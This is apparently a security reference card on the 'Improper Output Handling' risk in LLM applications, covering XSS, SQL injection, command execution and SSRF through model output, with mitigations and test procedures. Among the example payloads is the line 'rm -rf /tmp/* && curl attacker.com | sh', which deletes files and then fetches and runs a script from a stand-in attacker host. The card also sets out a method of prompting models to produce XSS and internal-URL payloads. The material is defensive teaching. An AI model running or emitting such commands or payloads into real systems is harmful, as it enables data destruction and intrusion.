name: Improper Output Handling
what_it_means: LLM-generated output is passed to downstream components (browsers, databases, shells, APIs) without sanitization, enabling XSS, SQL injection, code execution, or SSRF via AI-generated content.
animated_example: Like a secretary reading an instruction letter aloud on the intercom without checking if it secretly tells maintenance to unlock the vault.
quick_checks: Is LLM output sanitized (HTML-escaped, parameterized) before rendering in a browser or inserting into a database?
Is LLM-generated code executed in a sandbox with no network or filesystem access?
Are structured outputs validated against a strict schema before use in downstream systems?
Are LLM-generated URLs or commands blocked from direct execution without human review?

payload_types.description: LLM generates HTML/JavaScript that is rendered unsanitized in a browser
examples: Markdown-rendered response with embedded event handlers
LLM generates a link with javascript: URI
mitigation: HTML-encode all LLM output before rendering
Apply Content-Security-Policy to block inline scripts

payload_types.description: LLM-generated SQL queries or data used directly in database calls
examples: LLM constructs a query: SELECT * FROM users WHERE id='user_input'--
LLM-generated filter string inserted directly into ORM query
Dynamic SQL built from LLM natural language output
mitigation: Never concatenate LLM output directly into SQL
Use parameterized queries for all database operations

payload_types.description: LLM-generated shell commands or code executed without sandboxing
examples: LLM suggests: rm -rf /tmp/* && curl attacker.com | sh
Code interpreter executes LLM-written code with system access
LLM-generated config files with embedded shell commands
mitigation: Execute LLM-generated code in isolated sandboxes with no network/filesystem access
Require human review before executing any LLM-generated commands

payload_types.description: LLM generates URLs that are fetched by the server without validation
examples: LLM generates fetch URL pointing to internal metadata service
LLM-crafted redirect chain targeting internal resources
LLM output used as webhook URL without allowlist check
mitigation: Validate all LLM-generated URLs against an allowlist before fetching
Block RFC1918 and metadata IP ranges for server-initiated requests

how_to_test: Prompt the LLM to generate XSS payloads and check if they are rendered or escaped in the UI
Test whether LLM-generated SQL fragments are concatenated into live queries
Verify code interpreter sandbox: attempt file system access, network calls, or process spawning from LLM-generated code
Submit prompts that lead the LLM to generate internal IP URLs and verify these are blocked before fetching
Check if LLM output passes through output encoding before insertion into HTML, JSON, or SQL contexts
expected_outcomes: All LLM output is encoded/escaped before rendering in any downstream context
LLM-generated code executes in a sandboxed environment with no escape paths
No XSS, SQLi, or command injection reachable through LLM-generated content
minimal_example: LLM response contains <script>... → output encoder converts to <script>... → browser renders as text, not code
mitigation: Apply context-aware output encoding to all LLM-generated content before rendering — HTML-encode for browser contexts, parameterize for database contexts, and shell-escape for command execution contexts

Execute all LLM-generated code in isolated sandbox environments (containers, VMs) with no network access, no filesystem write access, and strict resource limits — never execute AI-generated code in the application's own runtime
Validate LLM-structured outputs (JSON, SQL, XML) against strict schemas before passing to downstream systems — reject any output that deviates from the expected format or type
Block server-side fetching of LLM-generated URLs unless they pass an allowlist check; enforce RFC1918 and metadata endpoint blocking to prevent SSRF via AI-generated content
